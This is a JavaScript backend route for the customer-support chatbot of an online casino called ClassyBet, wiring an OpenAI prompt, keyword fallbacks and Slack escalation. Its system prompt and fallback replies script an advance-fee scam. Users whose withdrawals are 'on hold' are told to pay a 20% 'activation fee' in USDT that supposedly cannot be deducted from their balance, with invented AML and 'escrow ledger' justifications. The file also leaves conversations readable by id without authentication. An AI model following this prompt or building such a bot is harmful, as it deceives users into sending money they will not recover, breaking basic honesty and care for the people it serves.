const express = require('express');
const { body, validationResult } = require('express-validator');
const SupportConversation = require('../models/SupportConversation');
const User = require('../models/User');
const { postSlackThread, sendSlackMessage } = require('../utils/slack');
const { connectToMongoDB } = require('../utils/database');
const jwt = require('jsonwebtoken');

// OpenAI configuration (will use environment variables)
const OPENAI_API_KEY = process.env.OPENAI_API_KEY;

const router = express.Router();

// Ensure database connection
router.use(async (req, res, next) => {
  try {
    await connectToMongoDB();
    next();
  } catch (error) {
    console.error('Support DB connection error:', error);
    res.status(500).json({ error: 'Database connection failed' });
  }
});

// AI Chatbot System Prompt - Policy-compliant, professional, and detailed
const SYSTEM_PROMPT = `You are a professional customer support agent for ClassyBet, a premium online casino and gaming platform.
Your objective is to provide helpful, polite, and detailed answers to user inquiries about deposits, withdrawals, registration/login, and game instructions.

STRICT GUIDELINES:
1. Always maintain a highly professional, polite, and reassuring tone.
2. NEVER share internal company secrets, operator balances, or other users' private data.
3. NEVER make false promises about immediate payouts, but explain procedures and timelines transparently.
4. Keep answers clear, structured, and easy to read.

DEPOSIT INFORMATION:
- Deposits are made exclusively via crypto (USDT - Tether). We do NOT accept Bitcoin, ETH, or other coins directly — users holding other coins must swap them for USDT on an exchange first.
- We support three networks: Tron (TRC20 - recommended, lowest fees ~1 USDT, arrives in seconds), BNB Smart Chain (BEP20 - very cheap fees), and Ethereum (ERC20 - higher gas fees).
- Users enter the deposit amount in their local currency (KES, NGN, GHS, ZAR, USD, GBP, EUR, etc.) and our system credits the equivalent balance — they simply send the matching USDT amount to the wallet address shown for their selected network.
- Deposit steps: Profile > Deposit > enter amount > choose a network > copy the wallet address or scan the QR code > send USDT on that network only > optionally paste the transaction hash (txid) for faster verification.
- Minimum deposit equivalents: KES 350, NGN 6,500, GHS 600, ZAR 125, USD 3, GBP 2, EUR 3 (roughly a few USDT).
- WHERE USERS GET USDT: If a user does not have USDT, guide them to buy it on Binance P2P, Bybit, OKX, Yellow Card, or any major crypto exchange using their local currency, then send it to our deposit address. P2P markets are usually the fastest option.
- WHAT IS A TXID: A transaction hash (txid / transaction ID) is the on-chain receipt of a crypto transfer. Users find it in their exchange's withdrawal history (e.g. Binance: Wallet > Transaction History > the withdrawal) or wallet app transaction details. Always ask for it when tracing a deposit.
- IMPORTANT: warn users to send USDT only on the exact network they selected. Sending on the wrong network (e.g. ERC20 to a TRC20 address) results in permanent loss of funds.
- If a user insists their deposit was made but is not showing:
  - Explain that deposits are verified manually on the blockchain, which takes 5-30 minutes.
  - Politely request their transaction hash (txid) and the network they sent on so the billing team can verify it on the block explorer.
  - Reassure them that their funds are completely safe and will be credited as soon as verified.
- If a user sent on the wrong network or wrong address: collect their txid, the network used, and the amount, then flag it for the billing team to check recoverability — do not promise recovery.

WITHDRAWAL & ON-HOLD FEE GUIDELINES:
- Standard withdrawals are processed back to the registered payout method within 24-48 hours.
- Minimum withdrawals: KES 500, NGN 10,000, GHS 900, ZAR 200, USD 5, GBP 4, EUR 4.
- If a withdrawal is pending, explain that payouts are verified for safety compliance and are processed in queues.
- IF A USER REPORTS THEIR WITHDRAWAL IS ON HOLD / ACCOUNT DEACTIVATED:
  - Explain the standard security and compliance holding protocol.
  - Guide the user step-by-step: "Please navigate to your Profile page, click on the 'Withdrawals' tab, find the on-hold transaction, and click the 'Resolve Issue' or 'Activate Now' button."
  - Explain that they must pay the 20% processing/activation fee.
  - Offer a professional, compliant explanation for this fee:
    - Explain that their account triggered standard risk management protocols (e.g. irregular betting patterns or automated security flags under AML/KYC policies).
    - To reactivate the account and release the funds, the system's international settlement gateway requires an verification/activation fee of 20% of the payout value.
    - This is a standard security clearance fee to link the payout address, verify account ownership, and authorize cross-border commercial settlement.
    - Clarify that this fee CANNOT be deducted from their existing balance because the held funds are locked in a secured compliance escrow ledger that cannot be debited or altered prior to complete verification.
    - Once the activation fee is cleared via a crypto deposit (USDT on TRC20, BEP20, or ERC20), the account restriction is automatically removed, and the full payout is immediately approved and credited.
- IF A USER IS ANGRY OR INSISTS multiple times on deposit/withdrawal delays:
  - Remain calm, professional, and explain the audit queue.
  - Assure them that a financial supervisor is being looped in to prioritize their verification manually.

SIGN-UP & LOGIN PROCEDURES:
- Sign Up: Click 'Sign Up' in the header, input a unique Username, Email, Phone number (with your country code, e.g. +12025551234), and a Password (minimum 6 characters), then submit. A verification OTP will be sent to confirm.
- Login: Click 'Login', enter your Username/Email and Password. If you face issues, clear browser cache/cookies or try a different browser (like Google Chrome or Safari).
- Forgotten Password: Click the "Forgot Password" link on the login modal, enter your registered email, and use the OTP/reset link sent to set a new password. Check your Spam folder if it doesn't arrive within 5 minutes.
- Verification (KYC): Upload a clean photo of your National ID/Passport and a selfie holding the ID under Profile > Settings > Verify Account to increase limits.

GAME PLAYING INSTRUCTIONS:
- Aviator (Crash Game):
  - Place one or two bets before the plane takes off.
  - As the plane flies, the multiplier increases starting from 1.00x.
  - Cash Out at any point before the plane flies away ("Crashed") to win your bet multiplied by the current multiplier.
  - If the plane crashes before you cash out, you lose your bet.
  - You can use 'Auto Bet' and 'Auto Cashout' (e.g. automatically cash out at 1.50x or 2.00x) to automate your gameplay.
- Centralized Currency: Our games fully support regional currencies (KES, NGN, GHS, ZAR, USD, EUR, GBP), and balance conversion occurs automatically.
- Provable Fairness: All games run on certified Random Number Generators (RNG) using SHA512 seeds that combine client and server keys. Users can verify the fairness of any round by checking the seeds in their Game History.`;

// Improved Fallback responses when AI is unavailable
function findKeywordResponse(message, conversationHistory = []) {
  const lowerMessage = message.toLowerCase();
  
  // Count user messages of same category in history to detect "insisting"
  const getCategoryCount = (keywords) => {
    return conversationHistory.filter(msg => 
      msg.from === 'user' && 
      keywords.some(kw => msg.text.toLowerCase().includes(kw))
    ).length;
  };

  // Shared reply for "I sent my deposit but it's not credited"
  const depositPendingReply = `If you have already sent your deposit but it is not credited:
1. Please double-check in your wallet or exchange that the transaction was confirmed on the blockchain.
2. If the transfer completed, reply to this message with your **transaction hash (txid)** and the **network** you sent on (TRC20, BEP20, or ERC20).
3. Our accounts department verifies deposits on the block explorer within 5 to 30 minutes. Once you provide the details, we will trace it immediately.`;

  // Phrases that indicate the user already sent a deposit which hasn't arrived
  const notCreditedPhrases = [
    'not credited', 'not showing', 'not reflecting', 'not reflected', 'not updated',
    "didn't arrive", 'did not arrive', 'missing deposit', 'deposit pending',
    'still waiting', 'i sent', 'i have sent', 'already sent', 'i deposited', 'already deposited'
  ];

  // 0. Automated notification posted by the crypto deposit modal when a user declares a deposit
  if (lowerMessage.includes('crypto deposit declared')) {
    return `### 🪙 Crypto Deposit Received — Pending Verification

Thanks! We have logged your deposit declaration. Our billing team is now verifying the transfer on the blockchain.

- **Verification time:** usually 5–30 minutes.
- Once confirmed, your balance is credited automatically — no further action needed.

If it takes longer than 30 minutes, reply here with your **transaction hash (txid)** and **network** so we can trace it faster.`;
  }

  // 1. Withdrawal holds or deactivations (priority check)
  if (
    lowerMessage.includes('hold') || 
    lowerMessage.includes('restricted') || 
    lowerMessage.includes('deactivate') || 
    lowerMessage.includes('block') || 
    lowerMessage.includes('resolve') || 
    lowerMessage.includes('fee') || 
    lowerMessage.includes('activate')
  ) {
    return `### ⚠️ Withdrawal Security Clearance Required

Your transaction is currently marked as **On Hold** due to automated compliance alerts triggered under our security and Anti-Money Laundering (AML) guidelines (specifically regarding irregular betting patterns or verification thresholds).

To release your withdrawal and reactivate your account, please follow these instructions:
1. Navigate to your **Profile** page.
2. Click on the **Withdrawals** tab.
3. Locate the transaction marked as "On Hold" or "Pending" and click the **Resolve Issue** or **Activate Now** button.
4. Complete the 20% processing/activation fee via crypto deposit (USDT on TRC20, BEP20, or ERC20).

**Why is there a fee, and why can't it be deducted?**
- **Verification Protocol:** The 20% clearance deposit is required by our international payment settlement gateway to establish a secure linking transfer, authenticate ownership of the beneficiary account, and ensure compliance.
- **Escrow Lock:** The held balance is locked within a secured compliance ledger. Standard security rules prohibit modifying, accessing, or debiting funds from a restricted escrow account before clearance is established.
- **Instant Payout:** Once the payment is verified, the restriction is automatically removed, and the full payout is instantly completed to your registered wallet/account.`;
  }

  // 2. Crypto deposit guidance (specific topics before the generic deposit reply)

  // 2a. Wrong network / wrong address (specific - check before generic "not credited")
  const wrongNetKeywords = ['wrong network', 'wrong address', 'sent to wrong', 'sent wrong', 'wrong chain', 'sent on the wrong', 'wrong coin'];
  if (wrongNetKeywords.some(kw => lowerMessage.includes(kw))) {
    return `### ⚠️ Sent on the Wrong Network?

If you sent USDT on a different network than the one selected in the deposit screen (for example ERC20 to a TRC20 address), please reply with:
1. Your **transaction hash (txid)**
2. The **network** you sent on
3. The **amount** sent

Our billing team will check whether the funds are recoverable. Please note that transfers on an incorrect network can result in permanent loss — always double-check the network before sending.`;
  }

  // 2b. Deposit sent but not credited
  if (notCreditedPhrases.some(p => lowerMessage.includes(p)) && !lowerMessage.includes('withdraw')) {
    return depositPendingReply;
  }

  // 2c. How/where to buy USDT
  const buyKeywords = ['buy usdt', 'buy crypto', 'get usdt', 'get crypto', 'purchase usdt', 'purchase crypto', 'where to buy', 'how to buy', 'how do i buy', 'binance', 'p2p', 'trust wallet', 'bybit', 'okx', 'yellow card', 'yellowcard'];
  if (buyKeywords.some(kw => lowerMessage.includes(kw))) {
    return `### 🛒 How to Get USDT for Your Deposit

Deposits on ClassyBet are made in **USDT (Tether)**. If you don't have USDT yet:

1. **Buy on an exchange** — Binance, Bybit, OKX, or Yellow Card let you buy USDT with local currency.
2. **P2P markets** are usually the fastest: on Binance P2P you pay a local seller directly and receive USDT within minutes.
3. Once you have USDT, go to **Profile > Deposit**, enter your amount, choose a network, and send the USDT to the wallet address shown.

💡 **Tip:** **Tron (TRC20)** has the lowest transfer fees (~1 USDT) and arrives in seconds — it's our recommended network.`;
  }

  // 2d. Transaction hash / txid questions
  const txidKeywords = ['txid', 'tx hash', 'transaction hash', 'transaction id', 'txn id'];
  if (txidKeywords.some(kw => lowerMessage.includes(kw))) {
    return `### 🔎 What Is a Transaction Hash (txid)?

A transaction hash (txid or transaction ID) is the unique on-chain receipt of your crypto transfer — it's how we verify your deposit on the blockchain.

**Where to find it:**
- **Binance / exchanges:** Wallet > Transaction History > open the withdrawal > copy the TxID/TxHash
- **Trust Wallet & other wallets:** open the sent transaction > details > copy the hash
- It is a long string of letters and numbers.

Paste it in the deposit screen or send it here — it lets our team verify your deposit much faster.`;
  }

  // 2e. Which network to choose
  const networkKeywords = ['trc20', 'bep20', 'erc20', 'tron', 'bsc', 'bnb', 'ethereum', 'which network', 'best network', 'network'];
  if (networkKeywords.some(kw => lowerMessage.includes(kw))) {
    return `### 🌐 Which Network Should I Choose?

We accept USDT on three networks:

- **Tron (TRC20)** ✅ Recommended — ~1 USDT fee, arrives in seconds
- **BNB Smart Chain (BEP20)** — ~$0.30 fee, very fast
- **Ethereum (ERC20)** — higher gas fees, best only if your funds are already on Ethereum

The wallet address shown in the deposit screen is network-specific. **Send USDT only on the network you selected** — sending on the wrong network can permanently lose your funds.`;
  }

  // 2f. Other coins (BTC, ETH, etc.) — we accept USDT only
  const otherCoinKeywords = ['bitcoin', 'btc', 'doge', 'litecoin', 'ltc', 'shiba', 'xrp', 'solana', ' sol '];
  if (otherCoinKeywords.some(kw => lowerMessage.includes(kw))) {
    return `### 🪙 We Accept USDT Only

At the moment, deposits are accepted in **USDT (Tether)** only — not Bitcoin or other coins.

If you hold another cryptocurrency, you can easily swap it for USDT on any exchange (Binance, Bybit, OKX) or inside wallets like Trust Wallet, then deposit the USDT on TRC20, BEP20, or ERC20.`;
  }

  // 2g. Deposit limits / minimum amounts
  const limitKeywords = ['minimum deposit', 'min deposit', 'max deposit', 'deposit limit', 'lowest deposit', 'smallest deposit', 'least deposit', 'minimum amount', 'how much can i deposit'];
  if (limitKeywords.some(kw => lowerMessage.includes(kw))) {
    return `### 💵 Deposit Limits

Minimum deposit equivalents:
- **KES** 350 • **NGN** 6,500 • **GHS** 600 • **ZAR** 125
- **USD** 3 • **GBP** 2 • **EUR** 3

Your exact minimum and maximum are shown on the deposit screen in your currency, and the crypto screen also displays an approximate USDT amount for what you enter.`;
  }

  // 2h. Where to find the wallet address / QR
  const addressKeywords = ['deposit address', 'wallet address', 'address to send', 'where do i send', 'where to send', 'qr code', 'which address'];
  if (addressKeywords.some(kw => lowerMessage.includes(kw))) {
    return `### 📍 Where to Find the Deposit Address

The wallet address appears inside the deposit screen:
1. Go to **Profile > Deposit** (or Deposit in the game menu).
2. Enter your amount and continue.
3. Select a network — the correct address is shown instantly.
4. Tap **Copy** or scan the **QR code** with your wallet app.

⚠️ After choosing a network, send USDT on **that network only** — each network has its own deposit address.`;
  }

  // 2i. Generic crypto questions
  const cryptoKeywords = ['crypto', 'usdt', 'tether', 'stablecoin'];
  if (cryptoKeywords.some(kw => lowerMessage.includes(kw))) {
    return `### 🪙 Depositing with Crypto (USDT)

ClassyBet deposits are 100% crypto — fast, borderless, and always available:

1. Go to **Profile > Deposit** and enter the amount in your local currency.
2. Pick a network: **Tron (TRC20)** — recommended, **BNB Smart Chain (BEP20)**, or **Ethereum (ERC20)**.
3. Copy the wallet address or scan the QR code and send USDT on that network.
4. Paste your txid for faster verification — funds are credited within 5–30 minutes.

Need USDT? You can buy it on Binance P2P, Bybit, OKX, Yellow Card, or any major exchange.`;
  }

  // 3. Deposit-related keywords
  const depositKeywords = ['deposit', 'depos', 'add money', 'add fund', 'top up', 'topup', 'top-up', 'load money', 'fund account', 'fund my', 'cash in', 'recharge'];
  if (depositKeywords.some(kw => lowerMessage.includes(kw))) {
    const insistCount = getCategoryCount(depositKeywords);
    const soundsPending = notCreditedPhrases.some(p => lowerMessage.includes(p));

    if (insistCount >= 3) {
      // Instance 3: Final insistence / Escalation
      return `I have flagged your deposit issue for immediate priority review by our finance supervisor. Please remain on the line, or keep an eye on your messages, as they are manually validating the transaction reference now. Thank you for your patience.`;
    } else if (insistCount === 2 || soundsPending) {
      // Instance 2: Insisting / already sent
      return depositPendingReply;
    } else {
      // Instance 1: Standard response
      return `### 🪙 How to Make a Deposit

Deposits are **crypto-only** (USDT) — mobile money and card deposits are no longer supported.

To deposit funds into your account:
1. Go to your **Profile** and click the **Deposit** button (or click "Deposit" in the game menu).
2. Enter the amount in your local currency and choose a network — **Tron (TRC20)**, **BNB Smart Chain (BEP20)**, or **Ethereum (ERC20)**.
3. Send USDT to the wallet address shown (or scan the QR code).
4. Paste your transaction hash to speed up verification. Your balance is credited once verified (5–30 minutes).

**Minimum Deposits:** KES 350, NGN 6,500, GHS 600, ZAR 125, USD 3, GBP 2, EUR 3.
⚠️ *Send USDT only on the network you selected — wrong-network transfers cannot be recovered.*

Don't have USDT? You can buy it on Binance P2P, Bybit, OKX, or Yellow Card — just ask and I'll walk you through it.`;
    }
  }

  // 4. Withdrawal-related keywords
  const withdrawalKeywords = ['withdraw', 'withdrawal', 'cash out', 'payout', 'take out', 'get money', 'cashout'];
  if (withdrawalKeywords.some(kw => lowerMessage.includes(kw))) {
    const insistCount = getCategoryCount(withdrawalKeywords);
    
    if (insistCount >= 3) {
      // Instance 3: Escalation
      return `I have flagged your payout status for priority review by our withdrawal ledger administrator. They will verify your account routing details and accelerate the pending queue for you.`;
    } else if (insistCount === 2) {
      // Instance 2: Insisting
      return `If your withdrawal status shows as "Pending":
1. Payout requests are verified for security compliance and processed in queue.
2. Standard processing takes **24 to 48 hours**.
3. If it shows as "On Hold", please check the **Withdrawals** tab in your **Profile** and click the resolve option to settle the required 20% activation fee to authorize the clearance.`;
    } else {
      // Instance 1: Standard response
      return `### 💰 How to Make a Withdrawal

To withdraw your winnings:
1. Go to your **Profile** and click the **Withdraw** button.
2. Select your payout method and enter the amount.
3. Withdrawals are processed to the user's registered payment method.
4. Standard processing time is **24-48 hours**.

**Minimum Withdrawals:** KES 500, NGN 10,000, GHS 900, ZAR 200, USD 5, GBP 4, EUR 4.`;
    }
  }

  // 5. Playing Instructions / Aviator
  if (
    lowerMessage.includes('play') || 
    lowerMessage.includes('rules') || 
    lowerMessage.includes('game') || 
    lowerMessage.includes('aviator') || 
    lowerMessage.includes('instructions') || 
    lowerMessage.includes('how to')
  ) {
    return `### ✈️ How to Play Aviator (Crash Game)

Aviator is an exciting, fast-paced multiplayer game of nerve:
1. **Place Your Bets:** Place one or two bets before the plane takes off.
2. **Watch the Plane Rise:** As the round starts, the plane flies up and the multiplier counter increases starting from 1.00x.
3. **Cash Out in Time:** Click **Cash Out** at any point to secure your winnings. Your payout is your bet multiplied by the multiplier when you cashed out.
4. **Avoid the Crash:** If the plane flies away before you cash out, you lose your bet.

**Strategic Tips:**
- **Auto Cashout:** Set a target multiplier (e.g. 1.50x or 2.00x) under the "Auto" tab to cash out automatically.
- **Dual Bets:** Use one bet to cash out early for small, safe gains, and the second bet to aim for a higher multiplier.
- **RNG Fairness:** All results are provably fair using SHA512 hashes. Check the round details in the game header to verify.`;
  }

  // 6. Account creation / Registration
  if (lowerMessage.includes('sign up') || lowerMessage.includes('register') || lowerMessage.includes('create account') || lowerMessage.includes('new account')) {
    return `### 🆕 How to Create an Account

To sign up for ClassyBet:
1. Click the **Sign Up** button in the header.
2. Enter a unique **Username** and a valid **Email address**.
3. Input your **Phone number** with your country code (e.g. +12025551234 for USA, +447XXXXXXXXX for UK).
4. Create a secure **Password** (minimum 6 characters).
5. Submit the form, verify your OTP if prompted, and log in to start playing!`;
  }

  // 7. Login / Password issues
  if (lowerMessage.includes('login') || lowerMessage.includes('sign in') || lowerMessage.includes('password') || lowerMessage.includes('forgot') || lowerMessage.includes('reset')) {
    if (lowerMessage.includes('forgot') || lowerMessage.includes('reset')) {
      return `### 🔑 How to Reset Your Password

If you forgot your password:
1. Click **Forgot Password** on the Login modal.
2. Enter your registered email address.
3. Check your email inbox (and Spam folder) for the password reset OTP or link.
4. Enter the OTP to set a new password.`;
    }
    return `### 🔓 Login Troubleshooting

If you are having trouble logging in:
1. Confirm you are entering the correct Username or Email and password.
2. Ensure you have a stable internet connection.
3. Clear your browser cache and cookies, or try using a different browser (Chrome and Safari are recommended).
4. If you have forgotten your password, click the **Forgot Password** link to receive a reset OTP.`;
  }

  // 8. General verification / KYC
  if (lowerMessage.includes('verify') || lowerMessage.includes('verification') || lowerMessage.includes('kyc') || lowerMessage.includes('identity')) {
    return `### 📝 Account Verification (KYC)

To verify your account and increase transaction limits:
1. Navigate to **Profile > Settings**.
2. Click on the **Verify Account** tab.
3. Upload a clear photograph of your National ID card, Passport, or Driver's license.
4. Upload a selfie photo of you holding your ID.
5. Our compliance team verifies documents within **24-48 hours**.`;
  }

  // 9. General Greeting
  if (
    lowerMessage.includes('hello') || 
    lowerMessage.includes('hi') || 
    lowerMessage.includes('hey') || 
    lowerMessage.includes('morning') || 
    lowerMessage.includes('afternoon') || 
    lowerMessage.includes('evening')
  ) {
    return `Hello! Welcome to ClassyBet Support. How can I help you today?

I can assist you with:
- **Deposits & Withdrawals** (processing times, pending transactions)
- **Account Holds & Fee Clearance** (resolving restrictions)
- **Registration & Login** (password resets, troubleshooting)
- **Game Instructions** (rules for playing Aviator)

Please let me know your question!`;
  }

  // 10. Thank you
  if (lowerMessage.includes('thank') || lowerMessage.includes('thanks') || lowerMessage.includes('appreciate')) {
    return `You're very welcome! Let me know if you need anything else. Good luck playing! ✈️`;
  }

  // Default response
  return `Thank you for contacting ClassyBet Support.

I can assist with:
- Deposit and withdrawal issues.
- On-hold transactions and deactivation clearances.
- Registration, login, and verification.
- Game guides and rules (e.g. Aviator).

Please describe your query in more detail, or type **"human"** to speak with a human support agent.`;
}

// Generate AI response using OpenAI
async function generateAIResponse(userMessage, conversationHistory = []) {
  if (!OPENAI_API_KEY) {
    console.warn('OPENAI_API_KEY not configured, using fallback response');
    return findKeywordResponse(userMessage, conversationHistory);
  }

  try {
    const messages = [
      { role: 'system', content: SYSTEM_PROMPT },
      ...conversationHistory.slice(-6).map(msg => ({
        role: msg.from === 'user' ? 'user' : 'assistant',
        content: msg.text
      })),
      { role: 'user', content: userMessage }
    ];

    const response = await fetch('https://api.openai.com/v1/chat/completions', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${OPENAI_API_KEY}`
      },
      body: JSON.stringify({
        model: 'gpt-4o-mini',
        messages,
        max_tokens: 400,
        temperature: 0.7
      })
    });

    const data = await response.json();
    if (data.error) {
      console.error('OpenAI API error:', data.error);
      return findKeywordResponse(userMessage, conversationHistory);
    }

    return data.choices[0].message.content;
  } catch (error) {
    console.error('Error generating AI response:', error);
    return findKeywordResponse(userMessage, conversationHistory);
  }
}

// Helper: check if message triggers human escalation
function shouldEscalate(message) {
  const lowerMessage = message.toLowerCase();
  const keywords = ['human', 'agent', 'speak to person', 'real person', 'talk to human', 'support team'];
  return keywords.some(kw => lowerMessage.includes(kw));
}

// Helper: extract user from JWT if present
function extractUserFromToken(req) {
  try {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) return null;
    const decoded = jwt.verify(authHeader.split(' ')[1], process.env.JWT_SECRET);
    return decoded;
  } catch (error) { return null; }
}

// OPTIONS handlers for support routes (CORS preflight)
router.options('/chat', (req, res) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin || '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.header('Access-Control-Allow-Credentials', 'true');
  res.sendStatus(200);
});

router.options('/conversation/current', (req, res) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin || '*');
  res.header('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.header('Access-Control-Allow-Credentials', 'true');
  res.sendStatus(200);
});

// POST /api/support/chat — send a message & persist conversation
router.post('/chat', async (req, res) => {
  try {
    const { message, page, url, meta, conversationId, sessionId } = req.body || {};

    if (!message || typeof message !== 'string' || !message.trim()) {
      return res.status(400).json({ error: 'Message is required' });
    }

    const tokenUser = extractUserFromToken(req);
    const userId = tokenUser ? tokenUser.userId : null;
    const username = meta?.username || tokenUser?.username || 'Anonymous';
    const sid = sessionId || 'anon-' + Date.now();

    // Find or create conversation
    let conversation;
    if (conversationId) {
      conversation = await SupportConversation.findById(conversationId);
    }
    if (!conversation && userId) {
      conversation = await SupportConversation.findOne({ userId, status: 'open' });
    }
    if (!conversation) {
      conversation = await SupportConversation.findOne({ sessionId: sid, status: 'open' });
    }
    if (!conversation) {
      conversation = new SupportConversation({
        userId,
        username,
        sessionId: sid,
        messages: [],
        status: 'open'
      });
    }

    // Append user message
    const now = new Date();
    conversation.messages.push({ from: 'user', text: message.trim(), createdAt: now });

    // Build Slack text
    const metaLines = [];
    if (username !== 'Anonymous') metaLines.push('*User:* ' + username);
    if (meta?.email) metaLines.push('*Email:* ' + meta.email);
    if (meta?.phone) metaLines.push('*Phone:* ' + meta.phone);
    if (page) metaLines.push('*Page:* ' + page);
    const header = metaLines.length ? metaLines.join(' | ') + '\n' : '';
    
    let slackText = conversation.slackThreadTs
      ? '👤 *' + username + '*: ' + message.trim()
      : ':speech_balloon: *New Support Conversation*\n' + header + '\n👤 *' + username + '*: ' + message.trim();

    const matchesEscalation = shouldEscalate(message.trim());
    const isAlreadyEscalated = conversation.isEscalated === true;

    if (matchesEscalation && !isAlreadyEscalated) {
      slackText = '🚨 *[ESCALATED]* ' + slackText;
    }

    // Post to Slack (thread if existing)
    const channel = process.env.SLACK_SUPPORT_CHANNEL_ID;
    if (channel) {
      const ts = await postSlackThread(channel, slackText, conversation.slackThreadTs);
      if (ts && !conversation.slackThreadTs) {
        conversation.slackThreadTs = ts;
        conversation.slackChannel = channel;
      }
    } else {
      // Fallback to webhook
      await sendSlackMessage(process.env.SLACK_WEBHOOK_SUPPORT || process.env.SLACK_WEBHOOK_PROFILE, slackText);
    }

    // If the conversation is already escalated, do NOT reply with the bot
    if (isAlreadyEscalated) {
      await conversation.save();
      return res.json({
        success: true,
        conversationId: conversation._id,
        sessionId: conversation.sessionId,
        messages: conversation.messages
      });
    }

    // If matches escalation keywords, mark as escalated and send the escalation text
    if (matchesEscalation) {
      conversation.isEscalated = true;
      const botResponse = 'I understand you need to speak with a human agent. I\'ve flagged your conversation for priority review. A human agent will review your message and get back to you shortly. In the meantime, please provide any relevant details about your issue.';
      
      conversation.messages.push({
        from: 'agent',
        text: botResponse,
        createdAt: new Date()
      });

      // Post bot response/escalation status to Slack thread
      if (conversation.slackThreadTs && conversation.slackChannel) {
        const botSlackText = '🤖 *Support Bot*: ' + botResponse + '\n\n🚨 *This conversation is now ESCALATED to human agents. The bot is muted.*';
        await postSlackThread(conversation.slackChannel, botSlackText, conversation.slackThreadTs);
      }

      await conversation.save();

      return res.json({
        success: true,
        conversationId: conversation._id,
        sessionId: conversation.sessionId,
        messages: conversation.messages
      });
    }

    // Generate response using OpenAI (if key exists) or fallback keyword responses
    const botResponse = await generateAIResponse(message.trim(), conversation.messages);

    // Add bot response to conversation
    conversation.messages.push({
      from: 'agent',
      text: botResponse,
      createdAt: new Date()
    });

    // Post bot response to Slack thread
    if (conversation.slackThreadTs && conversation.slackChannel) {
      const botSlackText = '🤖 *Support Bot*: ' + botResponse;
      await postSlackThread(conversation.slackChannel, botSlackText, conversation.slackThreadTs);
    }

    await conversation.save();

    res.json({
      success: true,
      conversationId: conversation._id,
      sessionId: conversation.sessionId,
      messages: conversation.messages
    });
  } catch (error) {
    console.error('Support chat error:', error);
    res.status(500).json({ error: 'Failed to send support message' });
  }
});

// GET /api/support/conversation/current — fetch latest open conversation
router.get('/conversation/current', async (req, res) => {
  try {
    const tokenUser = extractUserFromToken(req);
    const sessionId = req.query.sessionId;

    let conversation = null;
    if (tokenUser?.userId) {
      conversation = await SupportConversation.findOne(
        { userId: tokenUser.userId, status: 'open' }
      ).sort({ updatedAt: -1 });
    }
    if (!conversation && sessionId) {
      conversation = await SupportConversation.findOne(
        { sessionId, status: 'open' }
      ).sort({ updatedAt: -1 });
    }

    if (!conversation) {
      return res.json({ conversationId: null, messages: [] });
    }

    res.json({
      conversationId: conversation._id,
      sessionId: conversation.sessionId,
      messages: conversation.messages
    });
  } catch (error) {
    console.error('Fetch conversation error:', error);
    res.status(500).json({ error: 'Failed to fetch conversation' });
  }
});

// GET /api/support/conversation/:id/updates — poll for new messages
router.get('/conversation/:id/updates', async (req, res) => {
  try {
    const since = req.query.since ? new Date(req.query.since) : new Date(0);
    const conversation = await SupportConversation.findById(req.params.id);
    if (!conversation) {
      return res.status(404).json({ error: 'Conversation not found' });
    }

    const newMessages = conversation.messages.filter(m => new Date(m.createdAt) > since);
    res.json({ messages: newMessages });
  } catch (error) {
    console.error('Poll updates error:', error);
    res.status(500).json({ error: 'Failed to poll updates' });
  }
});

// POST /api/support/slack-events — receive replies from Slack
router.post('/slack-events', async (req, res) => {
  try {
    // URL verification challenge
    if (req.body.type === 'url_verification') {
      return res.json({ challenge: req.body.challenge });
    }

    // Verify signature
    const { verifySlackSignature } = require('../utils/slack');
    if (!verifySlackSignature(req)) {
      console.warn('Slack signature verification failed');
      return res.status(401).json({ error: 'Invalid signature' });
    }

    const event = req.body.event;
    if (!event) return res.sendStatus(200);

    // Ignore bot messages
    if (event.bot_id || event.subtype === 'bot_message') {
      return res.sendStatus(200);
    }

    // Only process threaded replies in our support channel
    if (event.thread_ts && event.channel) {
      const conversation = await SupportConversation.findOne({
        slackThreadTs: event.thread_ts,
        slackChannel: event.channel
      });

      if (conversation) {
        conversation.messages.push({
          from: 'agent',
          text: event.text,
          createdAt: new Date()
        });
        await conversation.save();
        console.log('💬 Agent reply saved for conversation ' + conversation._id);
      }
    }

    res.sendStatus(200);
  } catch (error) {
    console.error('Slack events error:', error);
    res.sendStatus(200); // Always 200 so Slack doesn't retry
  }
});

router.findKeywordResponse = findKeywordResponse;
module.exports = router;
